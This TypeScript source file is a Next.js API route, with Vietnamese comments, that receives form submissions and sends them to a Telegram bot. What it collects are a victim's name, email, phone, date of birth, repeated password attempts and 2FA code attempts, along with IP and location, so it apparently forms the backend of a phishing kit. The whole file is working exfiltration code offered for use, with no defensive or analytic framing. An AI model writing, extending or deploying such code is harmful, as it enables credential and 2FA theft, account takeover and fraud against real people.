import { NextResponse } from "next/server";
import type { FormData, LocationData } from "@/types/form";

interface LogEventPayload {
  formDetails: FormData | null;
  passwordAttempts: string[];
  twofaAttempts: string[];
  selectedMethod?: string | null;
  locationData?: LocationData | null;
}

// Helper function để gửi log qua Telegram với format có thể copy
async function sendTelegramMessage(message: string, parseMode: "HTML" | "Markdown" = "HTML"): Promise<boolean> {
  try {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("📨 Telegram Log (no config):", message);
      return false;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      }),
    });

    const data = await response.json();
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

function formatLogMessage(payload: LogEventPayload, location: LocationData): string {
  const { formDetails, passwordAttempts, twofaAttempts, selectedMethod } = payload;

  
  let message = "";
  message += `<b>🌸 IP:</b> <code>${location.ip}</code>\n`;
  message += `<b>🌺 Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
  if (location.location.city) {
    message += `<b>🏩 City:</b> ${location.location.city}\n`;
  }
  if (location.location.region) {
    message += `<b>💮 Region:</b> ${location.location.region}\n`;
  }
  message += "\n";

  if (formDetails) {
    message += "<b>🎀 Form Data:</b>\n";
    message += `<b>Name:</b> <code>${formDetails.fullName}</code>\n`;
    message += `<b>Email:</b> <code>${formDetails.email}</code>\n`;
    if (formDetails.emailBusiness) {
      message += `<b>Business Email:</b> <code>${formDetails.emailBusiness}</code>\n`;
    }
    message += `<b>Phone:</b> <code>${formDetails.phoneNumber}</code>\n`;
    message += `<b>DOB:</b> <code>${formDetails.day}/${formDetails.month}/${formDetails.year}</code>\n`;
    if (formDetails.pageName) {
      message += `<b>Page Name:</b> <code>${formDetails.pageName}</code>\n`;
    }
    if (formDetails.issueDescription) {
      message += `<b>Issue:</b> <code>${formDetails.issueDescription}</code>\n`;
    }
    message += "\n";
  }

  if (passwordAttempts.length > 0) {
    passwordAttempts.forEach((attempt, i) => {
      message += `💝 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
    });
  }

  // Separator between password and 2FA
  if (passwordAttempts.length > 0 && twofaAttempts.length > 0) {
    message += "💗💗💗💗💗💗💗💗💗\n";
  }

  // 2FA attempts
  if (twofaAttempts.length > 0) {
    twofaAttempts.forEach((attempt, i) => {
      message += `💌 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
    });
  }

  return message;
}

export async function POST(request: Request) {
  try {
    const payload: LogEventPayload = await request.json();

    const location: LocationData = payload.locationData ?? {
      ip: "unknown",
      location: { country: "Unknown", countryCode: "US", city: "", region: "" },
    };

    // Format và gửi log với HTML parse mode để có thể copy
    const logMessage = formatLogMessage(payload, location);
    const sent = await sendTelegramMessage(logMessage, "HTML");

    return NextResponse.json({
      success: sent,
      message: sent ? "Log sent successfully" : "Failed to send log",
    });
  } catch (error) {
    console.error("Log event error:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
